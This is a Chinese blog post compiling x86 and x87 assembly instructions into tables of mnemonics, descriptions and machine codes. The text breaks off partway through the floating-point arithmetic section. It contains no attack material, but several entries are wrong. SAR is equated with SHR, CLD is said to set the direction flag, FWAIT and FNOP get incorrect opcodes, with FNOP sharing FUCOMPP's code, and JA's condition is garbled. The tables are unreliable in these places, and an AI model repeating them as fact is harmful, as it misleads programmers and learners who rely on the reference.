        <content type="html"><![CDATA[<p>做了一下相关汇编指令的收集</p><h2 id="整数运算指令集"><a href="#整数运算指令集" class="headerlink" title="整数运算指令集"></a>整数运算指令集</h2><h3 id="数据传输指令"><a href="#数据传输指令" class="headerlink" title="数据传输指令"></a>数据传输指令</h3><p>它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据</p><h3 id="通用数据传送指令"><a href="#通用数据传送指令" class="headerlink" title="通用数据传送指令"></a>通用数据传送指令</h3><table><thead><tr><th align="center">MOV</th><th align="center">传送字或字节</th></tr></thead><tbody><tr><td align="center"><strong>MOVSX</strong></td><td align="center"><strong>先符号扩展,再传送</strong></td></tr><tr><td align="center"><strong>MOVZX</strong></td><td align="center"><strong>先零扩展,再传送</strong></td></tr><tr><td align="center"><strong>PUSH</strong></td><td align="center"><strong>把字压入堆栈</strong></td></tr><tr><td align="center"><strong>POP</strong></td><td align="center"><strong>把字弹出堆栈</strong></td></tr><tr><td align="center"><strong>PUSHA</strong></td><td align="center"><strong>把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈</strong></td></tr><tr><td align="center"><strong>POPA</strong></td><td align="center"><strong>把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈</strong></td></tr><tr><td align="center"><strong>PUSHAD</strong></td><td align="center"><strong>把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈</strong></td></tr><tr><td align="center"><strong>POPAD</strong></td><td align="center"><strong>把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈</strong></td></tr><tr><td align="center"><strong>BSWAP</strong></td><td align="center"><strong>交换32位寄存器里字节的顺序</strong></td></tr><tr><td align="center"><strong>XCHG</strong></td><td align="center"><strong>交换字或字节(至少有一个操作数为寄存器,段寄存器不可作为操作数)</strong></td></tr><tr><td align="center"><strong>CMPXCHG</strong></td><td align="center"><strong>比较并交换操作数(第二个操作数必须为累加器AL/AX/EAX)</strong></td></tr><tr><td align="center"><strong>XADD</strong></td><td align="center"><strong>先交换再累加(结果在第一个操作数里)</strong></td></tr><tr><td align="center"><strong>XLAT</strong></td><td align="center"><strong>字节查表转换</strong></td></tr></tbody></table><h3 id="输入输出端口传送指令"><a href="#输入输出端口传送指令" class="headerlink" title="输入输出端口传送指令"></a>输入输出端口传送指令</h3><p>输入输出端口由立即方式指定时，其范围是 <strong>0-255</strong>; 由寄存器 <strong>DX</strong> 指定时,其范围是：<strong>0-65535</strong></p><table><thead><tr><th align="center">IN</th><th align="center">I/O端口输入</th><th align="center">语法: IN   累加器,    {端口号│DX}</th></tr></thead><tbody><tr><td align="center"><strong>OUT</strong></td><td align="center"><strong>I/O端口输出</strong></td><td align="center"><strong>语法: OUT {端口号│DX},累加器</strong></td></tr></tbody></table><h3 id="目的地址传送指令"><a href="#目的地址传送指令" class="headerlink" title="目的地址传送指令"></a>目的地址传送指令</h3><table><thead><tr><th align="center">LEA</th><th align="center">装入有效地址</th><th align="center">LEA DX,string ;把偏移地址存到DX</th></tr></thead><tbody><tr><td align="center"><strong>LDS</strong></td><td align="center"><strong>传送目标指针,把指针内容装入DS</strong></td><td align="center"><strong>LDS SI,string;把段地址:偏移地址存到DS:SI</strong></td></tr><tr><td align="center"><strong>LES</strong></td><td align="center"><strong>传送目标指针,把指针内容装入ES</strong></td><td align="center"><strong>LES DI,string;把段地址:偏移地址存到ES:DI</strong></td></tr><tr><td align="center"><strong>LFS</strong></td><td align="center"><strong>传送目标指针,把指针内容装入FS</strong></td><td align="center"><strong>LFS DI,string;把段地址:偏移地址存到FS:DI</strong></td></tr><tr><td align="center"><strong>LGS</strong></td><td align="center"><strong>传送目标指针,把指针内容装入GS</strong></td><td align="center"><strong>LGS DI,string;把段地址:偏移地址存到GS:DI</strong></td></tr><tr><td align="center"><strong>LSS</strong></td><td align="center"><strong>传送目标指针,把指针内容装入SS</strong></td><td align="center"><strong>LSS DI,string;把段地址:偏移地址存到SS:DI</strong></td></tr></tbody></table><h3 id="标志传送指令"><a href="#标志传送指令" class="headerlink" title="标志传送指令"></a>标志传送指令</h3><table><thead><tr><th align="center">LAHF</th><th align="center">标志寄存器传送,把标志装入AH</th></tr></thead><tbody><tr><td align="center"><strong>SAHF</strong></td><td align="center"><strong>标志寄存器传送,把AH内容装入标志寄存器</strong></td></tr><tr><td align="center"><strong>PUSHF</strong></td><td align="center"><strong>标志入栈</strong></td></tr><tr><td align="center"><strong>POPF</strong></td><td align="center"><strong>标志出栈</strong></td></tr><tr><td align="center"><strong>PUSHD</strong></td><td align="center"><strong>32位标志入栈</strong></td></tr><tr><td align="center"><strong>POPD</strong></td><td align="center"><strong>32位标志出栈</strong></td></tr></tbody></table><h3 id="算术运算指令"><a href="#算术运算指令" class="headerlink" title="算术运算指令"></a>算术运算指令</h3><table><thead><tr><th align="center">ADD</th><th align="center">加法</th></tr></thead><tbody><tr><td align="center"><strong>ADC</strong></td><td align="center"><strong>带进位加法</strong></td></tr><tr><td align="center"><strong>INC</strong></td><td align="center"><strong>加 1</strong></td></tr><tr><td align="center"><strong>AAA</strong></td><td align="center"><strong>加法的ASCII码调整</strong></td></tr><tr><td align="center"><strong>DAA</strong></td><td align="center"><strong>加法的十进制调整</strong></td></tr><tr><td align="center"><strong>SUB</strong></td><td align="center"><strong>减法</strong></td></tr><tr><td align="center"><strong>SBB</strong></td><td align="center"><strong>带借位减法</strong></td></tr><tr><td align="center"><strong>DEC</strong></td><td align="center"><strong>减 1</strong></td></tr><tr><td align="center"><strong>NEG</strong></td><td align="center"><strong>求反(以    0 减之)</strong></td></tr><tr><td align="center"><strong>CMP</strong></td><td align="center"><strong>比较(两操作数作减法,仅修改标志位,不回送结果)</strong></td></tr><tr><td align="center"><strong>AAS</strong></td><td align="center"><strong>减法的ASCII码调整</strong></td></tr><tr><td align="center"><strong>DAS</strong></td><td align="center"><strong>减法的十进制调整</strong></td></tr><tr><td align="center"><strong>MUL</strong></td><td align="center"><strong>无符号乘法,结果回送AH和AL(字节运算),或DX和AX(字运算)</strong></td></tr><tr><td align="center"><strong>IMUL</strong></td><td align="center"><strong>整数乘法,结果回送AH和AL(字节运算),或DX和AX(字运算)</strong></td></tr><tr><td align="center"><strong>AAM</strong></td><td align="center"><strong>乘法的ASCII码调整</strong></td></tr><tr><td align="center"><strong>DIV</strong></td><td align="center"><strong>无符号除法,结果回送:商回送AL,余数回送AH, (字节运算);或 商回送AX,余数回送DX, (字运算)</strong></td></tr><tr><td align="center"><strong>IDIV</strong></td><td align="center"><strong>整数除法.结果回送:商回送AL,余数回送AH, (字节运算);或 商回送AX,余数回送DX, (字运算)</strong></td></tr><tr><td align="center"><strong>AAD</strong></td><td align="center"><strong>除法的ASCII码调整</strong></td></tr><tr><td align="center"><strong>CBW</strong></td><td align="center"><strong>字节转换为字(把AL中字节的符号扩展到AH中去)</strong></td></tr><tr><td align="center"><strong>CWD</strong></td><td align="center"><strong>字转换为双字(把AX中的字的符号扩展到DX中去)</strong></td></tr><tr><td align="center"><strong>CWDE</strong></td><td align="center"><strong>字转换为双字(把AX中的字符号扩展到EAX中去)</strong></td></tr><tr><td align="center"><strong>CDQ</strong></td><td align="center"><strong>双字扩展(把EAX中的字的符号扩展到EDX中去)</strong></td></tr></tbody></table><h3 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h3><p>以下八种移位指令,其移位次数可达255次,移位一次时, 可直接用操作码. 如 SHL AX,1.  移位&gt;1次时, 则由寄存器CL给出移位次数.  如 MOV CL,04   SHL AX,CL  </p><table><thead><tr><th align="center">AND</th><th align="center">与运算</th></tr></thead><tbody><tr><td align="center"><strong>OR</strong></td><td align="center"><strong>或运算</strong></td></tr><tr><td align="center"><strong>XOR</strong></td><td align="center"><strong>异或运算</strong></td></tr><tr><td align="center"><strong>NOT</strong></td><td align="center"><strong>取反</strong></td></tr><tr><td align="center"><strong>TEST</strong></td><td align="center"><strong>测试(两操作数作与运算,仅修改标志位,不回送结果)</strong></td></tr><tr><td align="center"><strong>SHL</strong></td><td align="center"><strong>逻辑左移</strong></td></tr><tr><td align="center"><strong>SAL</strong></td><td align="center"><strong>算术左移(=SHL)</strong></td></tr><tr><td align="center"><strong>SHR</strong></td><td align="center"><strong>逻辑右移</strong></td></tr><tr><td align="center"><strong>SAR</strong></td><td align="center"><strong>算术右移(=SHR)</strong></td></tr><tr><td align="center"><strong>ROL</strong></td><td align="center"><strong>循环左移</strong></td></tr><tr><td align="center"><strong>ROR</strong></td><td align="center"><strong>循环右移</strong></td></tr><tr><td align="center"><strong>RCL</strong></td><td align="center"><strong>通过进位的循环左移</strong></td></tr><tr><td align="center"><strong>RCR</strong></td><td align="center"><strong>通过进位的循环右移</strong></td></tr></tbody></table><h3 id="串指令"><a href="#串指令" class="headerlink" title="串指令"></a>串指令</h3><blockquote><p>DS:SI 源串段寄存器 :源串变址.<br>ES:DI 目标串段寄存器:目标串变址.<br>CX 重复次数计数器.<br>AL/AX 扫描值.<br>D标志   0表示重复操作中SI和DI应自动增量; 1表示应自动减量.<br> Z标志   用来控制扫描或比较操作的结束.  </p></blockquote><table><thead><tr><th align="center">MOVS</th><th align="center">串传送(MOVSB 传送字符；MOVSW 传送字；MOVSD 传送双字)</th></tr></thead><tbody><tr><td align="center"><strong>CMPS</strong></td><td align="center"><strong>串比较(CMPSB 比较字符;CMPSW 比较字)</strong></td></tr><tr><td align="center"><strong>SCAS</strong></td><td align="center"><strong>串扫描(把AL或AX的内容与目标串作比较,比较结果反映在标志位)</strong></td></tr><tr><td align="center"><strong>LODS</strong></td><td align="center"><strong>装入串(把源串中的元素(字或字节)逐一装入AL或AX中( LODSB传送字符;LODSW传送字  LODSD 传送双字)</strong></td></tr><tr><td align="center"><strong>STOS</strong></td><td align="center"><strong>保存串(是LODS的逆过程)</strong></td></tr><tr><td align="center"><strong>REP</strong></td><td align="center"><strong>当CX/ECX&lt;&gt;0时重复</strong></td></tr><tr><td align="center"><strong>REPE/REPZ</strong></td><td align="center"><strong>当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复</strong></td></tr><tr><td align="center"><strong>REPNE/REPNZ</strong></td><td align="center"><strong>当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复</strong></td></tr><tr><td align="center"><strong>REPC</strong></td><td align="center"><strong>当CF=1且CX/ECX&lt;&gt;0时重复</strong></td></tr><tr><td align="center"><strong>REPNC</strong></td><td align="center"><strong>当CF=0且CX/ECX&lt;&gt;0时重复</strong></td></tr></tbody></table><h3 id="程序转移指令"><a href="#程序转移指令" class="headerlink" title="程序转移指令"></a>程序转移指令</h3><h4 id="无条件转移指令"><a href="#无条件转移指令" class="headerlink" title="无条件转移指令"></a>无条件转移指令</h4><p><strong>长转移</strong></p><table><thead><tr><th align="center">JMP</th><th align="center">无条件转移指令</th></tr></thead><tbody><tr><td align="center"><strong>CALL</strong></td><td align="center"><strong>过程调用</strong></td></tr><tr><td align="center"><strong>RET/RETF</strong></td><td align="center"><strong>过程返回</strong></td></tr></tbody></table><h4 id="条件转移指令"><a href="#条件转移指令" class="headerlink" title="条件转移指令"></a>条件转移指令</h4><p>*<em>短转移,-128到+127的距离内,当且仅当(SF XOR OF)=1时,OP1&lt;OP2 *</em></p><table><thead><tr><th align="center">JA/JNBE</th><th align="center">不小于或不等于时转移</th></tr></thead><tbody><tr><td align="center"><strong>JAE/JNB</strong></td><td align="center"><strong>大于或等于转移</strong></td></tr><tr><td align="center"><strong>JB/JNAE</strong></td><td align="center"><strong>小于转移</strong></td></tr><tr><td align="center"><strong>JBE/JNA</strong></td><td align="center"><strong>小于或等于转移</strong></td></tr></tbody></table><p><strong>以上四条,测试无符号整数运算的结果(标志C和Z)</strong></p><table><thead><tr><th align="center">JG/JNLE</th><th align="center">大于转移</th></tr></thead><tbody><tr><td align="center"><strong>JGE/JNL</strong></td><td align="center"><strong>大于或等于转移</strong></td></tr><tr><td align="center"><strong>JL/JNGE</strong></td><td align="center"><strong>小于转移</strong></td></tr><tr><td align="center"><strong>JLE/JNG</strong></td><td align="center"><strong>小于或等于转移</strong></td></tr></tbody></table><p><strong>以上四条,测试带符号整数运算的结果(标志S,O和Z)</strong></p><table><thead><tr><th align="center">JE/JZ</th><th align="center">等于转移</th></tr></thead><tbody><tr><td align="center"><strong>JNE/JNZ</strong></td><td align="center"><strong>不等于时转移</strong></td></tr><tr><td align="center"><strong>JC</strong></td><td align="center"><strong>有进位时转移</strong></td></tr><tr><td align="center"><strong>JNC</strong></td><td align="center"><strong>无进位时转移</strong></td></tr><tr><td align="center"><strong>JNO</strong></td><td align="center"><strong>不溢出时转移</strong></td></tr><tr><td align="center"><strong>JNP/JPO</strong></td><td align="center"><strong>奇偶性为奇数时转移</strong></td></tr><tr><td align="center"><strong>JNS</strong></td><td align="center"><strong>符号位为 “0” 时转移</strong></td></tr><tr><td align="center"><strong>JO</strong></td><td align="center"><strong>溢出转移</strong></td></tr><tr><td align="center"><strong>JP/JPE</strong></td><td align="center"><strong>奇偶性为偶数时转移</strong></td></tr><tr><td align="center"><strong>JS</strong></td><td align="center"><strong>符号位为 “1” 时转移</strong></td></tr></tbody></table><h4 id="循环控制指令"><a href="#循环控制指令" class="headerlink" title="循环控制指令"></a>循环控制指令</h4><p><strong>短转移</strong></p><table><thead><tr><th align="center">LOOP</th><th align="center">CX不为零时循环</th></tr></thead><tbody><tr><td align="center"><strong>LOOPE/LOOPZ</strong></td><td align="center"><strong>CX不为零且标志Z=1时循环</strong></td></tr><tr><td align="center"><strong>LOOPNE/LOOPNZ</strong></td><td align="center"><strong>CX不为零且标志Z=0时循环</strong></td></tr><tr><td align="center"><strong>JCXZ</strong></td><td align="center"><strong>CX为零时转移</strong></td></tr><tr><td align="center"><strong>JECXZ</strong></td><td align="center"><strong>ECX为零时转移</strong></td></tr></tbody></table><h4 id="中断指令"><a href="#中断指令" class="headerlink" title="中断指令"></a>中断指令</h4><table><thead><tr><th align="center">INT</th><th align="center">中断指令</th></tr></thead><tbody><tr><td align="center"><strong>INTO</strong></td><td align="center"><strong>溢出中断</strong></td></tr><tr><td align="center"><strong>IRET</strong></td><td align="center"><strong>中断返回</strong></td></tr></tbody></table><h4 id="处理器控制指令"><a href="#处理器控制指令" class="headerlink" title="处理器控制指令"></a>处理器控制指令</h4><table><thead><tr><th align="center">HLT</th><th align="center">处理器暂停,  直到出现中断或复位信号才继续</th></tr></thead><tbody><tr><td align="center"><strong>WAIT</strong></td><td align="center"><strong>当芯片引线TEST为高电平时使CPU进入等待状态</strong></td></tr><tr><td align="center"><strong>ESC</strong></td><td align="center"><strong>转换到外处理器</strong></td></tr><tr><td align="center"><strong>LOCK</strong></td><td align="center"><strong>封锁总线</strong></td></tr><tr><td align="center"><strong>NOP</strong></td><td align="center"><strong>空操作</strong></td></tr><tr><td align="center"><strong>STC</strong></td><td align="center"><strong>置进位标志位</strong></td></tr><tr><td align="center"><strong>CLC</strong></td><td align="center"><strong>清进位标志位</strong></td></tr><tr><td align="center"><strong>CMC</strong></td><td align="center"><strong>进位标志取反</strong></td></tr><tr><td align="center"><strong>STD</strong></td><td align="center"><strong>置方向标志位</strong></td></tr><tr><td align="center"><strong>CLD</strong></td><td align="center"><strong>清方向标志位</strong></td></tr><tr><td align="center"><strong>STI</strong></td><td align="center"><strong>置中断允许位</strong></td></tr><tr><td align="center"><strong>CLI</strong></td><td align="center"><strong>清中断允许位</strong></td></tr></tbody></table><h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><table><thead><tr><th align="center">DW</th><th align="center">定义字(2字节)</th></tr></thead><tbody><tr><td align="center"><strong>PROC</strong></td><td align="center"><strong>定义过程</strong></td></tr><tr><td align="center"><strong>ENDP</strong></td><td align="center"><strong>过程结束</strong></td></tr><tr><td align="center"><strong>SEGMENT</strong></td><td align="center"><strong>定义段</strong></td></tr><tr><td align="center"><strong>ASSUME</strong></td><td align="center"><strong>建立段寄存器寻址</strong></td></tr><tr><td align="center"><strong>ENDS</strong></td><td align="center"><strong>段结束</strong></td></tr><tr><td align="center"><strong>END</strong></td><td align="center"><strong>程序结束</strong></td></tr></tbody></table><h3 id="处理机控制指令：标志处理指令"><a href="#处理机控制指令：标志处理指令" class="headerlink" title="处理机控制指令：标志处理指令"></a>处理机控制指令：标志处理指令</h3><table><thead><tr><th align="center">CLC</th><th align="center">进位位置0指令</th></tr></thead><tbody><tr><td align="center"><strong>CMC</strong></td><td align="center"><strong>进位位求反指令</strong></td></tr><tr><td align="center"><strong>STC</strong></td><td align="center"><strong>进位位置为1指令</strong></td></tr><tr><td align="center"><strong>CLD</strong></td><td align="center"><strong>方向标志置1指令</strong></td></tr><tr><td align="center"><strong>STD</strong></td><td align="center"><strong>方向标志位置1指令</strong></td></tr><tr><td align="center"><strong>CLI</strong></td><td align="center"><strong>中断标志置0指令</strong></td></tr><tr><td align="center"><strong>STI</strong></td><td align="center"><strong>中断标志置1指令</strong></td></tr><tr><td align="center"><strong>NOP</strong></td><td align="center"><strong>无操作</strong></td></tr><tr><td align="center"><strong>HLT</strong></td><td align="center"><strong>停机</strong></td></tr><tr><td align="center"><strong>WAIT</strong></td><td align="center"><strong>等待</strong></td></tr><tr><td align="center"><strong>ESC</strong></td><td align="center"><strong>换码</strong></td></tr><tr><td align="center"><strong>LOCK</strong></td><td align="center"><strong>封锁</strong></td></tr></tbody></table><h2 id="浮点运算指令集"><a href="#浮点运算指令集" class="headerlink" title="浮点运算指令集"></a>浮点运算指令集</h2><h3 id="控制指令"><a href="#控制指令" class="headerlink" title="控制指令"></a>控制指令</h3><p>带9B的控制指令前缀F变为FN时浮点不检查，机器码去掉9B</p><table><thead><tr><th align="center">FINIT</th><th align="center">初始化浮点部件</th><th align="center">机器码  9B DB E3</th></tr></thead><tbody><tr><td align="center"><strong>FCLEX</strong></td><td align="center"><strong>清除异常</strong></td><td align="center"><strong>机器码  9B DB E2</strong></td></tr><tr><td align="center"><strong>FDISI</strong></td><td align="center"><strong>浮点检查禁止中断</strong></td><td align="center"><strong>机器码  9B DB E1</strong></td></tr><tr><td align="center"><strong>FENI</strong></td><td align="center"><strong>浮点检查禁止中断二</strong></td><td align="center"><strong>机器码  9B DB E0</strong></td></tr><tr><td align="center"><strong>WAIT</strong></td><td align="center"><strong>同步CPU和FPU</strong></td><td align="center"><strong>机器码  9B</strong></td></tr><tr><td align="center"><strong>FWAIT</strong></td><td align="center"><strong>同步CPU和FPU</strong></td><td align="center"><strong>机器码  D9 D0</strong></td></tr><tr><td align="center"><strong>FNOP</strong></td><td align="center"><strong>无操作</strong></td><td align="center"><strong>机器码  DA E9</strong></td></tr><tr><td align="center"><strong>FXCH</strong></td><td align="center"><strong>交换ST(0)和ST(1)</strong></td><td align="center"><strong>机器码  D9 C9</strong></td></tr><tr><td align="center"><strong>FXCH ST(i)</strong></td><td align="center"><strong>交换ST(0)和ST(i)</strong></td><td align="center"><strong>机器码  D9 C1iii</strong></td></tr><tr><td align="center"><strong>FSTSW ax</strong></td><td align="center"><strong>状态字到ax</strong></td><td align="center"><strong>机器码  9B DF E0</strong></td></tr><tr><td align="center"><strong>FSTSW   word ptr mem</strong></td><td align="center"><strong>状态字到mem</strong></td><td align="center"><strong>机器码  9B DD mm111mmm</strong></td></tr><tr><td align="center"><strong>FLDCW   word ptr mem</strong></td><td align="center"><strong>mem到状态字</strong></td><td align="center"><strong>机器码  D9 mm101mmm</strong></td></tr><tr><td align="center"><strong>FSTCW   word ptr mem</strong></td><td align="center"><strong>控制字到mem</strong></td><td align="center"><strong>机器码  9B D9 mm111mmm</strong></td></tr><tr><td align="center"><strong>FLDENV  word ptr mem</strong></td><td align="center"><strong>mem到全环境</strong></td><td align="center"><strong>机器码  D9 mm100mmm</strong></td></tr><tr><td align="center"><strong>FSTENV  word ptr mem</strong></td><td align="center"><strong>全环境到mem</strong></td><td align="center"><strong>机器码  9B D9 mm110mmm</strong></td></tr><tr><td align="center"><strong>FRSTOR  word ptr mem</strong></td><td align="center"><strong>mem到FPU状态</strong></td><td align="center"><strong>机器码  DD mm100mmm</strong></td></tr><tr><td align="center"><strong>FSAVE   word ptr mem</strong></td><td align="center"><strong>FPU状态到mem</strong></td><td align="center"><strong>机器码  9B DD mm110mmm</strong></td></tr><tr><td align="center"><strong>FFREE ST(i)</strong></td><td align="center"><strong>标志ST(i)未使用</strong></td><td align="center"><strong>机器码  DD C0iii</strong></td></tr><tr><td align="center"><strong>FDECSTP</strong></td><td align="center"><strong>减少栈指针1-&gt;0 2-&gt;1</strong></td><td align="center"><strong>机器码  D9 F6</strong></td></tr><tr><td align="center"><strong>FINCSTP</strong></td><td align="center"><strong>增加栈指针0-&gt;1 1-&gt;2</strong></td><td align="center"><strong>机器码  D9 F7</strong></td></tr><tr><td align="center"><strong>FSETPM</strong></td><td align="center"><strong>浮点设置保护</strong></td><td align="center"><strong>机器码  DB E4</strong></td></tr></tbody></table><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><table><thead><tr><th align="center">FLDZ</th><th align="center">将0.0装入ST(0)</th><th align="center">机器码  D9 EE</th></tr></thead><tbody><tr><td align="center"><strong>FLD1</strong></td><td align="center"><strong>将1.0装入ST(0)</strong></td><td align="center"><strong>机器码  D9 E8</strong></td></tr><tr><td align="center"><strong>FLDPI</strong></td><td align="center"><strong>将π装入ST(0)</strong></td><td align="center"><strong>机器码  D9 EB</strong></td></tr><tr><td align="center"><strong>FLDL2T</strong></td><td align="center"><strong>将ln10/ln2装入ST(0)</strong></td><td align="center"><strong>机器码  D9 E9</strong></td></tr><tr><td align="center"><strong>FLDL2E</strong></td><td align="center"><strong>将1/ln2装入ST(0)</strong></td><td align="center"><strong>机器码  D9 EA</strong></td></tr><tr><td align="center"><strong>FLDLG2</strong></td><td align="center"><strong>将ln2/ln10装入ST(0)</strong></td><td align="center"><strong>机器码  D9 EC</strong></td></tr><tr><td align="center"><strong>FLDLN2</strong></td><td align="center"><strong>将ln2装入ST(0)</strong></td><td align="center"><strong>机器码  D9 ED</strong></td></tr><tr><td align="center"><strong>FLD    real4 ptr mem</strong></td><td align="center"><strong>装入mem的单精度浮点数</strong></td><td align="center"><strong>机器码  D9 mm000mmm</strong></td></tr><tr><td align="center"><strong>FLD    real8 ptr mem</strong></td><td align="center"><strong>装入mem的双精度浮点数</strong></td><td align="center"><strong>机器码  DD mm000mmm</strong></td></tr><tr><td align="center"><strong>FLD   real10 ptr mem</strong></td><td align="center"><strong>装入mem的十字节浮点数</strong></td><td align="center"><strong>机器码  DB mm101mmm</strong></td></tr><tr><td align="center"><strong>FILD    word ptr mem</strong></td><td align="center"><strong>装入mem的二字节整数</strong></td><td align="center"><strong>机器码  DF mm000mmm</strong></td></tr><tr><td align="center"><strong>FILD   dword ptr mem</strong></td><td align="center"><strong>装入mem的四字节整数</strong></td><td align="center"><strong>机器码  DB mm000mmm</strong></td></tr><tr><td align="center"><strong>FILD   qword ptr mem</strong></td><td align="center"><strong>装入mem的八字节整数</strong></td><td align="center"><strong>机器码  DF mm101mmm</strong></td></tr><tr><td align="center"><strong>FBLD   tbyte ptr mem</strong></td><td align="center"><strong>装入mem的十字节BCD数</strong></td><td align="center"><strong>机器码  DF mm100mmm</strong></td></tr><tr><td align="center"><strong>FST    real4 ptr mem</strong></td><td align="center"><strong>保存单精度浮点数到mem</strong></td><td align="center"><strong>机器码  D9 mm010mmm</strong></td></tr><tr><td align="center"><strong>FST    real8 ptr mem</strong></td><td align="center"><strong>保存双精度浮点数到mem</strong></td><td align="center"><strong>机器码  DD mm010mmm</strong></td></tr><tr><td align="center"><strong>FIST    word ptr mem</strong></td><td align="center"><strong>保存二字节整数到mem</strong></td><td align="center"><strong>机器码  DF mm010mmm</strong></td></tr><tr><td align="center"><strong>FIST   dword ptr mem</strong></td><td align="center"><strong>保存四字节整数到mem</strong></td><td align="center"><strong>机器码  DB mm010mmm</strong></td></tr><tr><td align="center"><strong>FSTP   real4 ptr mem</strong></td><td align="center"><strong>保存单精度浮点数到mem并出栈</strong></td><td align="center"><strong>机器码  D9 mm011mmm</strong></td></tr><tr><td align="center"><strong>FSTP   real8 ptr mem</strong></td><td align="center"><strong>保存双精度浮点数到mem并出栈</strong></td><td align="center"><strong>机器码  DD mm011mmm</strong></td></tr><tr><td align="center"><strong>FSTP  real10 ptr mem</strong></td><td align="center"><strong>保存十字节浮点数到mem并出栈</strong></td><td align="center"><strong>机器码  DB mm111mmm</strong></td></tr><tr><td align="center"><strong>FISTP   word ptr mem</strong></td><td align="center"><strong>保存二字节整数到mem并出栈</strong></td><td align="center"><strong>机器码  DF mm011mmm</strong></td></tr><tr><td align="center"><strong>FISTP  dword ptr mem</strong></td><td align="center"><strong>保存四字节整数到mem并出栈</strong></td><td align="center"><strong>机器码  DB mm011mmm</strong></td></tr><tr><td align="center"><strong>FISTP  qword ptr mem</strong></td><td align="center"><strong>保存八字节整数到mem并出栈</strong></td><td align="center"><strong>机器码  DF mm111mmm</strong></td></tr><tr><td align="center"><strong>FBSTP  tbyte ptr mem</strong></td><td align="center"><strong>保存十字节BCD数到mem并出栈</strong></td><td align="center"><strong>机器码  DF mm110mmm</strong></td></tr><tr><td align="center"><strong>FCMOVB</strong></td><td align="center"><strong>ST(0),ST(i) &lt;时传送</strong></td><td align="center"><strong>机器码  DA C0iii</strong></td></tr><tr><td align="center"><strong>FCMOVBE</strong></td><td align="center"><strong>ST(0),ST(i) &lt;=时传送</strong></td><td align="center"><strong>机器码  DA D0iii</strong></td></tr><tr><td align="center"><strong>FCMOVE</strong></td><td align="center"><strong>ST(0),ST(i) =时传送</strong></td><td align="center"><strong>机器码  DA C1iii</strong></td></tr><tr><td align="center"><strong>FCMOVNB</strong></td><td align="center"><strong>ST(0),ST(i) &gt;=时传送</strong></td><td align="center"><strong>机器码  DB C0iii</strong></td></tr><tr><td align="center"><strong>FCMOVNBE</strong></td><td align="center"><strong>ST(0),ST(i) &gt;时传送</strong></td><td align="center"><strong>机器码  DB D0iii</strong></td></tr><tr><td align="center"><strong>FCMOVNE</strong></td><td align="center"><strong>ST(0),ST(i) !=时传送</strong></td><td align="center"><strong>机器码  DB C1iii</strong></td></tr><tr><td align="center"><strong>FCMOVNU</strong></td><td align="center"><strong>ST(0),ST(i) 有序时传送</strong></td><td align="center"><strong>机器码  DB D1iii</strong></td></tr><tr><td align="center"><strong>FCMOVU</strong></td><td align="center"><strong>ST(0),ST(i) 无序时传送</strong></td><td align="center"><strong>机器码  DA D1iii</strong></td></tr></tbody></table><h3 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h3><table><thead><tr><th align="center">FCOM</th><th align="center">ST(0)-ST(1)</th><th align="center">机器码  D8 D1</th></tr></thead><tbody><tr><td align="center"><strong>FCOMI</strong></td><td align="center"><strong>ST(0),ST(i)  ST(0)-ST(1)</strong></td><td align="center"><strong>机器码  DB F0iii</strong></td></tr><tr><td align="center"><strong>FCOMIP</strong></td><td align="center"><strong>ST(0),ST(i)  ST(0)-ST(1)并出栈</strong></td><td align="center"><strong>机器码  DF F0iii</strong></td></tr><tr><td align="center"><strong>FCOM   real4 ptr mem</strong></td><td align="center"><strong>ST(0)-实数mem</strong></td><td align="center"><strong>机器码  D8 mm010mmm</strong></td></tr><tr><td align="center"><strong>FCOM   real8 ptr mem</strong></td><td align="center"><strong>ST(0)-实数mem</strong></td><td align="center"><strong>机器码  DC mm010mmm</strong></td></tr><tr><td align="center"><strong>FICOM   word ptr mem</strong></td><td align="center"><strong>ST(0)-整数mem</strong></td><td align="center"><strong>机器码  DE mm010mmm</strong></td></tr><tr><td align="center"><strong>FICOM  dword ptr mem</strong></td><td align="center"><strong>ST(0)-整数mem</strong></td><td align="center"><strong>机器码  DA mm010mmm</strong></td></tr><tr><td align="center"><strong>FICOMP  word ptr mem</strong></td><td align="center"><strong>ST(0)-整数mem并出栈</strong></td><td align="center"><strong>机器码  DE mm011mmm</strong></td></tr><tr><td align="center"><strong>FICOMP dword ptr mem</strong></td><td align="center"><strong>ST(0)-整数mem并出栈</strong></td><td align="center"><strong>机器码  DA mm011mmm</strong></td></tr><tr><td align="center"><strong>FTST</strong></td><td align="center"><strong>ST(0)-0</strong></td><td align="center"><strong>机器码  D9 E4</strong></td></tr><tr><td align="center"><strong>FUCOM  ST(i)</strong></td><td align="center"><strong>ST(0)-ST(i)</strong></td><td align="center"><strong>机器码  DD E0iii</strong></td></tr><tr><td align="center"><strong>FUCOMP ST(i)</strong></td><td align="center"><strong>ST(0)-ST(i)并出栈</strong></td><td align="center"><strong>机器码  DD E1iii</strong></td></tr><tr><td align="center"><strong>FUCOMPP</strong></td><td align="center"><strong>ST(0)-ST(1)并二次出栈</strong></td><td align="center"><strong>机器码  DA E9</strong></td></tr><tr><td align="center"><strong>FXAM</strong></td><td align="center"><strong>ST(0)规格类型</strong></td><td align="center"><strong>机器码  D9 E5</strong></td></tr></tbody></table><h3 id="运算指令"><a href="#运算指令" class="headerlink" title="运算指令"></a>运算指令</h3><table><thead><tr><th>FADD</th><th>把目的操作数 (直接接在指令后的变量或堆栈缓存器) 与来源操作数 (接在目的操作数后的变量或堆栈缓存器)  相加，并将结果存入目的操作数</th></tr></thead><tbody><tr><td><strong>FADDP</strong></td><td><strong>这个指令是使目的操作数加上 ST  缓存器，并弹出 ST 缓存器，而目的操作数必须是堆栈缓存器的其中之一，最后不管目的操作数为何，经弹出一次后，目的操作数会变成上一个堆栈缓存器了</strong></td></tr><tr><td><strong>FIADD</strong></td><td><strong>FIADD 是把 ST   加上来源操作数，然后再存入 ST 